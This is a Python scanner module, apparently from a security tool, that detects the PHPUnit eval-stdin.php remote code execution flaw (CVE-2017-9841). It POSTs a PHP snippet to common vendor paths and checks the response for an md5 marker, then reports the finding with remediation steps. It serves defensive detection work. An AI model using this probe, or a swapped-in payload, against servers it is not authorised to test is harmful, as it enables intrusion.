"""PHPUnit eval-stdin.php RCE (CVE-2017-9841).

Auto-validation: POST kode `<?php echo md5(1); ?>` ke endpoint vendor PHPUnit;
validasi marker `c4ca4238a0b923820dcc509a6f75849b` (md5 dari "1") di response.
"""
from __future__ import annotations

from urllib.parse import urljoin

from cyberloka.core import Finding, HttpClient, Severity, Target
from cyberloka.core.config import ScanConfig

PATHS = [
    "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/phpunit/Util/PHP/eval-stdin.php",
    "/vendor/phpunit/Util/PHP/eval-stdin.php",
    "/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/phpunit/src/Util/PHP/eval-stdin.php",
    "/lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
    "/laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php",
]
PAYLOAD = "<?php echo md5(31337); ?>"
MARKER = "0d59b5dee72c0a82b22b85ab1bb59a3a"  # md5(31337)


def run(target: Target, config: ScanConfig) -> list[Finding]:
    findings: list[Finding] = []
    client = HttpClient(config)
    try:
        for path in PATHS:
            url = urljoin(target.origin + "/", path.lstrip("/"))
            r = client.post(url, data=PAYLOAD,
                            headers={"Content-Type": "text/plain"},
                            allow_redirects=False)
            if r is None:
                continue
            body = r.text or ""
            if MARKER in body:
                findings.append(Finding(
                    module="phpunit_rce",
                    title="PHPUnit eval-stdin Remote Code Execution (CVE-2017-9841) terkonfirmasi",
                    severity=Severity.CRITICAL,
                    description=(
                        "Endpoint vendor PHPUnit ter-expose di webroot dan "
                        "mengeksekusi kode PHP yang dikirim sebagai body POST. "
                        "Marker md5(31337) muncul di response = RCE pre-auth."
                    ),
                    target=url,
                    urls=[url],
                    evidence=f"POST {url} body={PAYLOAD!r} -> body memuat marker '{MARKER}'",
                    cwe="CWE-94",
                    confidence="confirmed",
                    remediation=(
                        "Hapus folder `vendor/` dari webroot. Konfigurasi "
                        "Apache/Nginx menolak akses ke `/vendor/`. Patch "
                        "PHPUnit ke 4.8.28 / 5.6.3 atau lebih baru. Jangan "
                        "deploy dependency `dev` ke production."
                    ),
                    references=[
                        "https://nvd.nist.gov/vuln/detail/CVE-2017-9841",
                        "https://github.com/sebastianbergmann/phpunit/blob/master/ChangeLog-5.6.md",
                    ],
                ))
                break
    finally:
        client.close()
    return findings
